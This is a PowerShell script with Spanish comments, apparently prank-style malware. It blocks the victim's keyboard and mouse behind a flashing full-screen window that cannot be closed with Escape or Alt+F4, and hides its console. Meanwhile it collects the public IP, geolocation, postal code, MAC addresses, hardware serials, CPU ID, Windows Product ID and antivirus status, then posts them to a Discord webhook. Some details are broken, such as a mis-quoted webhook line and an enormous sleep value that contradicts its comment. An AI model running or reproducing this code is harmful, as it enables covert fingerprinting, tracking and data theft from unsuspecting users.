try {
    # Función para ejecutar la broma en paralelo
    $bromaScript = {
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing
        
        $signature = @"
        [DllImport("user32.dll")]
        public static extern bool BlockInput(bool fBlockIt);
"@
        $blockInput = Add-Type -MemberDefinition $signature -Name "Win32BlockInput" -Namespace Win32Functions -PassThru
        
        $blockInput::BlockInput($true)
        
        $form = New-Object Windows.Forms.Form
        $form.WindowState = "Maximized"
        $form.FormBorderStyle = "None"
        $form.BackColor = [System.Drawing.Color]::Black
        $form.Topmost = $true
        $form.ControlBox = $false
        $form.MaximizeBox = $false
        $form.MinimizeBox = $false
        $form.ShowInTaskbar = $false
        $form.KeyPreview = $true
        
        # Prevenir cerrado con teclas
        $form.Add_KeyDown({
            if ($_.KeyCode -eq "Escape" -or $_.KeyCode -eq "F4" -and $_.Alt) {
                $_.SuppressKeyPress = $true
            }
        })
        
        $timer = New-Object Windows.Forms.Timer
        $timer.Interval = 10
        $random = New-Object Random
        
        $timer.Add_Tick({
            $form.BackColor = [System.Drawing.Color]::FromArgb(
                $random.Next(256),
                $random.Next(256),
                $random.Next(256)
            )
        })
        
        # CORRECCIÓN: 30 segundos (30000 milisegundos)
        $shutdownTimer = New-Object Windows.Forms.Timer
        $shutdownTimer.Interval = 30000  # 30 SEGUNDOS
        $shutdownTimer.Add_Tick({
            $timer.Stop()
            $shutdownTimer.Stop()
            $blockInput::BlockInput($false)
            $form.Close()
        })
        
        $timer.Start()
        $shutdownTimer.Start()
        
        # Ocultar consola de PowerShell si existe
        try {
            $null = (Get-Process -Id $PID).MainWindowHandle
            $windowCode = '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);'
            $windowAsync = Add-Type -MemberDefinition $windowCode -Name "Win32ShowWindowAsync" -Namespace Win32Functions -PassThru
            $hwnd = (Get-Process -Id $PID).MainWindowHandle
            if ($hwnd -ne [IntPtr]::Zero) {
                $windowAsync::ShowWindow($hwnd, 0) | Out-Null
            }
        } catch {}
        
        $form.ShowDialog()
        $blockInput::BlockInput($false)
    }
    
    # Iniciar la broma en un job separado (ejecución en paralelo)
    Start-Job -ScriptBlock $bromaScript -Name "BromaColores"
    
    # ====================== INFORMACIÓN DEL SISTEMA ======================
    # Obtener datos básicos del sistema
    $PC = $env:COMPUTERNAME
    $Date = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
    
    # ====================== INFORMACIÓN DE DIRECCIÓN/RED ======================
    # Obtener direcciones MAC
    $MACs = try { 
        (Get-NetAdapter -Physical | Where-Object {$_.Status -eq 'Up'} | Select-Object -ExpandProperty MacAddress | Where-Object { $_ -ne $null }) -join ", " 
    } catch { 
        "No disponible" 
    }
    
    # Obtener IP pública con timeout
    $PublicIP = try { 
        (Invoke-RestMethod -Uri "https://ifconfig.me/ip" -TimeoutSec 10).Trim()
    } catch { 
        "No disponible" 
    }

    # Obtener información de geolocalización de la IP
    $LocationInfo = "No disponible"
    $PostalCode = "No disponible"
    if ($PublicIP -and $PublicIP -ne "No disponible") {
        try {
            $geoData = Invoke-RestMethod -Uri "https://ipapi.co/$PublicIP/json/" -TimeoutSec 10
            if ($geoData.country_name) {
                $city = if ($geoData.city) { $geoData.city } else { "N/A" }
                $region = if ($geoData.region) { $geoData.region } else { "N/A" }
                $country = if ($geoData.country_name) { $geoData.country_name } else { "N/A" }
                $org = if ($geoData.org) { $geoData.org } else { "N/A" }
                $postal = if ($geoData.postal) { $geoData.postal } else { "N/A" }
                
                $LocationInfo = "Pais: $country | Ciudad: $city | Region: $region | ISP: $org"
                $PostalCode = $postal
            }
        } catch {
            $LocationInfo = "No disponible"
            $PostalCode = "No disponible"
        }
    }

    # ====================== INFORMACIÓN DE HARDWARE ======================
    # Obtener información del fabricante
    $ComputerManufacturer = try { 
        $manufacturer = (Get-CimInstance Win32_ComputerSystem).Manufacturer
        if ([string]::IsNullOrWhiteSpace($manufacturer) -or $manufacturer -eq "System manufacturer" -or $manufacturer -eq "To be filled by O.E.M.") {
            $manufacturer = (Get-CimInstance Win32_ComputerSystemProduct).Vendor
        }
        if ([string]::IsNullOrWhiteSpace($manufacturer)) {
            "No disponible / OEM"
        } else {
            $manufacturer
        }
    } catch { 
        "No disponible" 
    }

    # Obtener modelo del ordenador
    $ComputerModel = try { 
        $model = (Get-CimInstance Win32_ComputerSystem).Model
        if ([string]::IsNullOrWhiteSpace($model) -or $model -eq "System Product Name" -or $model -eq "To be filled by O.E.M.") {
            $model = (Get-CimInstance Win32_ComputerSystemProduct).Name
        }
        if ([string]::IsNullOrWhiteSpace($model)) {
            "No disponible / OEM"
        } else {
            $model
        }
    } catch { 
        "No disponible" 
    }

    # Obtener información del sistema
    $SystemType = try { (Get-CimInstance Win32_ComputerSystem).SystemType } catch { "No disponible" }
    $TotalMemoryGB = try { "$([math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory/1GB, 2)) GB" } catch { "No disponible" }

    # Obtener información del disco
    $DiskSerial = try { 
        (Get-CimInstance Win32_DiskDrive | Select-Object -ExpandProperty SerialNumber | Where-Object { $_ -ne $null }) -join ", " 
    } catch { 
        "No disponible" 
    }
    
    # Obtener información de la motherboard
    $MotherboardSerial = try { 
        (Get-CimInstance Win32_BaseBoard | Select-Object -ExpandProperty SerialNumber | Where-Object { $_ -ne $null }) -join ", " 
    } catch { 
        "No disponible" 
    }
    
    # Obtener información del chasis
    $ChassisSerial = try { 
        (Get-CimInstance Win32_SystemEnclosure | Select-Object -ExpandProperty SerialNumber | Where-Object { $_ -ne $null }) -join ", " 
    } catch { 
        "No disponible" 
    }
    
    # Obtener UUID SMBIOS
    $SMBIOSUUID = try { 
        (Get-CimInstance Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID | Where-Object { $_ -ne $null }) -join ", " 
    } catch { 
        "No disponible" 
    }
    
    # Obtener serial de BIOS
    $BIOSSerial = try { 
        (Get-CimInstance Win32_BIOS | Select-Object -ExpandProperty SerialNumber | Where-Object { $_ -ne $null }) -join ", " 
    } catch { 
        "No disponible" 
    }
    
    # Obtener ID del procesador
    $CPUID = try { 
        (Get-CimInstance Win32_Processor | Select-Object -ExpandProperty ProcessorId | Where-Object { $_ -ne $null }) -join ", " 
    } catch { 
        "No disponible" 
    }

    # ====================== INFORMACIÓN DE WINDOWS ======================
    # Obtener Product ID de Windows
    $WinProductID = try { 
        (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' -ErrorAction Stop).ProductID 
    } catch { 
        "No disponible" 
    }

    # ====================== INFORMACIÓN DE SEGURIDAD ======================
    # Obtener información del antivirus (MÉTODO MEJORADO)
    $AntivirusInfo = "No detectado"
    
    try {
        # Método 1: Usar WMI de SecurityCenter2 (Windows 8/10/11)
        $antivirusProducts = @()
        
        # Intentar con el namespace de SecurityCenter2
        try {
            $antivirusProducts = Get-CimInstance -Namespace "root\SecurityCenter2" -ClassName "AntiVirusProduct" -ErrorAction Stop
        } catch {
            # Si falla, intentar con el namespace antiguo
            try {
                $antivirusProducts = Get-CimInstance -Namespace "root\SecurityCenter" -ClassName "AntiVirusProduct" -ErrorAction Stop
            } catch {
                # Si ambos fallan, intentar método alternativo
            }
        }
        
        if ($antivirusProducts -and $antivirusProducts.Count -gt 0) {
            $avList = @()
            foreach ($av in $antivirusProducts) {
                $avName = $av.displayName
                
                # Método más confiable para determinar estado
                $productState = $av.productState
                if ($productState) {
                    # Convertir a hexadecimal para mejor análisis
                    $stateHex = "0x$($productState.ToString('X6'))"
                    
                    # Analizar los bytes del estado
                    $byte1 = ($productState -shr 16) -band 0xFF
                    $byte2 = ($productState -shr 8) -band 0xFF
                    $byte3 = $productState -band 0xFF
                    
                    # Determinar estado basado en los bytes
                    $avStatus = "Desconocido"
                    $avEnabled = "No"
                    $avUpToDate = "No"
                    
                    # Byte 1: 0x00 = Desconocido, 0x01 = Activado, 0x02 = Desactivado
                    if ($byte1 -eq 0x00) { $avEnabled = "Desconocido" }
                    elseif ($byte1 -eq 0x01) { $avEnabled = "Si" }
                    elseif ($byte1 -eq 0x02) { $avEnabled = "No" }
                    
                    # Byte 2: 0x00 = Desconocido, 0x01 = Actualizado, 0x02 = Desactualizado
                    if ($byte2 -eq 0x00) { $avUpToDate = "Desconocido" }
                    elseif ($byte2 -eq 0x01) { $avUpToDate = "Si" }
                    elseif ($byte2 -eq 0x02) { $avUpToDate = "No" }
                    
                    $avList += "$avName (Activado: $avEnabled, Actualizado: $avUpToDate)"
                } else {
                    $avList += $avName
                }
            }
            
            if ($avList.Count -gt 0) {
                $AntivirusInfo = $avList -join " | "
            }
        } else {
            # Método 2: Verificar Windows Defender específicamente
            try {
                # Verificar servicio de Windows Defender
                $defenderService = Get-Service -Name WinDefend -ErrorAction SilentlyContinue
                if ($defenderService -and $defenderService.Status -eq 'Running') {
                    # Verificar configuración del registro
                    $tamperProtection = try {
                        (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name "TamperProtection" -ErrorAction SilentlyContinue).TamperProtection
                    } catch { $null }
                    
                    # Verificar si la protección en tiempo real está activa
                    $realTimeProtection = try {
                        (Get-MpPreference -ErrorAction SilentlyContinue).DisableRealtimeMonitoring
                    } catch { $null }
                    
                    $defenderStatus = "Windows Defender (Activado"
                    if ($realTimeProtection -eq $false -or $realTimeProtection -eq 0) {
                        $defenderStatus += ", Proteccion en tiempo real: Activada"
                    } else {
                        $defenderStatus += ", Proteccion en tiempo real: Desactivada"
                    }
                    
                    if ($tamperProtection -eq 1 -or $tamperProtection -eq 5) {
                        $defenderStatus += ", Proteccion contra manipulaciones: Activada"
                    }
                    
                    $defenderStatus += ")"
                    $AntivirusInfo = $defenderStatus
                } else {
                    $AntivirusInfo = "Windows Defender (Servicio no ejecutandose)"
                }
            } catch {
                # Método 3: Verificar en el registro
                try {
                    $securityProviders = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Security Center\Provider\Av" -ErrorAction SilentlyContinue
                    if ($securityProviders) {
                        $avProviders = @()
                        foreach ($provider in $securityProviders.PSObject.Properties) {
                            if ($provider.Name -notlike "PS*") {
                                $avProviders += $provider.Value
                            }
                        }
                        if ($avProviders.Count -gt 0) {
                            $AntivirusInfo = "Antivirus detectados: " + ($avProviders -join ", ")
                        }
                    }
                } catch {
                    $AntivirusInfo = "No se pudo detectar antivirus"
                }
            }
        }
    } catch {
        $AntivirusInfo = "Error en deteccion de antivirus"
    }

    # ====================== ENVIAR A DISCORD ======================
    # Definir el Webhook de Discord
    $webhookUrl = '????????????????????????????????????????????????????????????????''

    # Crear el contenido del embed organizado por categorías
    $payload = @{
        embeds = @(
            @{
                title = "INFORME DEL SISTEMA"
                description = "**Fecha y Hora:** $Date`n**Equipo:** $PC"
                color = 9055202
                fields = @(
                    @{
                        name = "DIRECCION Y RED"
                        value = "**IP Publica:** $PublicIP`n**Direcciones MAC:** $MACs`n**Codigo Postal:** $PostalCode`n**Geolocalizacion:** $LocationInfo"
                        inline = $false
                    },
                    @{
                        name = "INFORMACION DEL SISTEMA"
                        value = "**Fabricante:** $ComputerManufacturer`n**Modelo:** $ComputerModel`n**Tipo de Sistema:** $SystemType`n**Memoria RAM:** $TotalMemoryGB"
                        inline = $true
                    },
                    @{
                        name = "HARDWARE (SERIALES)"
                        value = "**Disco:** $DiskSerial`n**Motherboard:** $MotherboardSerial`n**Chasis:** $ChassisSerial`n**SMBIOS UUID:** $SMBIOSUUID`n**BIOS:** $BIOSSerial`n**CPU ID:** $CPUID"
                        inline = $true
                    },
                    @{
                        name = "WINDOWS"
                        value = "**Product ID:** $WinProductID"
                        inline = $false
                    },
                    @{
                        name = "SEGURIDAD"
                        value = "**Antivirus:** $AntivirusInfo"
                        inline = $false
                    }
                )
                footer = @{
                    text = "Informe generado automaticamente"
                }
                timestamp = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ssZ")
            }
        )
    } | ConvertTo-Json -Depth 10

    # Enviar mensaje a Discord
    $response = Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json; charset=utf-8'

    # Mensaje de éxito
    Write-Host "Informacion enviada correctamente a Discord con embed organizado por categorias."
    
    # CORRECCIÓN: Esperar solo 35 segundos (30 de la broma + 5 de margen)
    Start-Sleep -Seconds 10000000000
    Get-Job -Name "BromaColores" | Remove-Job -Force
}
catch {
    Write-Host "Error: $($_.Exception.Message)"
    # Asegurarse de desbloquear el input si hay error
    try {
        $signature = @"
        [DllImport("user32.dll")]
        public static extern bool BlockInput(bool fBlockIt);
"@
        $blockInput = Add-Type -MemberDefinition $signature -Name "Win32BlockInput" -Namespace Win32Functions -PassThru
        $blockInput::BlockInput($false)
    } catch {}
}